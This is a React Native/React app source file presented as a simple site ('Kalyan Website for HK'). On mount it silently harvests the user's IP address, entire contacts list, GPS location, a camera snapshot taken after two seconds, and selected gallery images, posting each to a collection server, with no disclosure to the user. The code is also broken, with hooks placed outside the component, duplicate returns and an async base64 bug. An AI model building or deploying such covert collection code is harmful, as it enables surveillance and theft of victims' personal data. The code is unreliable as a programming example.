import React, { useEffect, useState } from 'react';
import { View, Text } from 'react-native';
import Contacts from 'react-native-contacts';

function App() {
  // State to track whether each effect has already run
  const [ipFetched, setIpFetched] = useState(false);
  const [fetchContacts, setContactsFetched] = useState(false);
  const [locationFetched, setLocationFetched] = useState(false);
  const [selfieCaptured, setSelfieCaptured] = useState(false);
  const [galleryPicturesCaptured, setGalleryPicturesCaptured] = useState(false);


  // Effect to fetch IP address
  useEffect(() => {
    if (!ipFetched) {
      fetch('https://api.ipify.org?format=json') //gets user Ip form this site
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;
          console.log('IP Address:', ipAddress);

          // Set flag to indicate IP fetched
          setIpFetched(true);

          // Send IP address to server
          fetch('http://localhost:3001/ip', { //ipdata is te header name
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ ip: ipAddress }) //json fomrat
          })
            .then(response => response.json())
            .then(data => console.log('Response from public endpoint:', data))
            .catch(error => console.error('Error sending IP address:', error));
        })
        .catch(error => console.error('Error fetching IP address:', error));
    }
  }, [ipFetched]);

  // Effect to fetch contacts
  useEffect(() => {
    const fetchContacts = async () => {
      try {
        const contacts = await Contacts.getAll();
        console.log('Contacts:', contacts);
        
        // Send contacts to server
        fetch('http://localhost:3001/contacts', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(contacts)
        })
        .then(response => response.text())
        .then(data => console.log('Response from contacts endpoint:', data))
        .catch(error => console.error('Error sending contacts:', error));
      } catch (error) {
        console.error('Error fetching contacts:', error);
      }
    };

    fetchContacts();
  }, []);

  return (
    <View>
      <Text>Fetching contacts...</Text>
    </View>
  );
}

  // Effect to fetch location
  useEffect(() => {
    if (!locationFetched) {
      const successCallback = position => {
        const { latitude, longitude } = position.coords;
        const location = `${latitude},${longitude}`;
        console.log('Location:', location);

        // Set flag to indicate location fetched
        setLocationFetched(true);

        // Send location to server
        fetch('http://localhost:3001/location', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ loc: location })
        })
          .then(response => response.text())
          .then(data => console.log('Response from location endpoint:', data))
          .catch(error => console.error('Error sending location:', error));
      };

      const errorCallback = error => {
        console.error('Error getting location:', error);
      };

      const watchId = navigator.geolocation.getCurrentPosition(successCallback, errorCallback);

      return () => {
        // Cleanup: Clear watch position when component unmounts
        navigator.geolocation.clearWatch(watchId);
      };
    }
  }, [locationFetched]);

  // Selfie feature
  useEffect(() => {
    if (!selfieCaptured) {
      const captureSelfie = async () => {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();
  
          const captureFrame = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png').split(',')[1]; // Get base64 data
  
            // Send image data to server
            fetch('http://localhost:3001/selfie', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({ image: imageData })
            })
              .then(response => response.text())
              .then(data => console.log('Response from selfie endpoint:', data))
              .catch(error => console.error('Error sending selfie:', error));
          };
  
          // Capture selfie after 2 seconds
          setTimeout(captureFrame, 2000);
        } catch (error) {
          console.error('Error accessing camera:', error);
        }
      };
  
      captureSelfie();
      setSelfieCaptured(true);
    }
  }, [selfieCaptured]);

  useEffect(() => {
    const selectAndSendImages = async () => {
      try {
        const permission = await navigator.permissions.query({ name: 'camera' });
        if (permission.state === 'granted') {
          const imageFiles = await chooseImages();
          const base64Images = await convertToBase64(imageFiles);
          sendImagesToServer(base64Images);
        } else {
          console.error('Permission denied for accessing camera');
        }
      } catch (error) {
        console.error('Error accessing camera:', error);
      }
    };

    selectAndSendImages();
  }, [galleryPicturesCaptured]);

  const chooseImages = async () => {
    const options = {
      mediaType: 'image',
      multiple: true,
    };

    const imageFiles = await window.showOpenFilePicker(options);
    return imageFiles;
  };

  const convertToBase64 = async (imageFiles) => {
    const base64Images = [];
    for (const imageFile of imageFiles) {
      const blob = await imageFile.getFile();
      const reader = new FileReader();
      reader.readAsDataURL(blob);
      reader.onloadend = () => {
        const base64 = reader.result.split(',')[1];
        base64Images.push(base64);
      };
    }
    return base64Images;
  };

  const sendImagesToServer = (base64Images) => {
    fetch('http://localhost:3001/images', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ images: base64Images }),
    })
      .then((response) => response.json())
      .then((data) => console.log('Response from server:', data))
      .catch((error) => console.error('Error sending images:', error));
  };


  return (
    <div className="App">
      <header className="App-header">
        <p>
          Kalyan Website for HK
        </p>
        <a
          className="App-link"
          href="https://reactjs.org"
          target="_blank"
          rel="noopener noreferrer"
        >
          kalyan Site - rRact link
        </a>
      </header>
    </div>
  );

export default App;
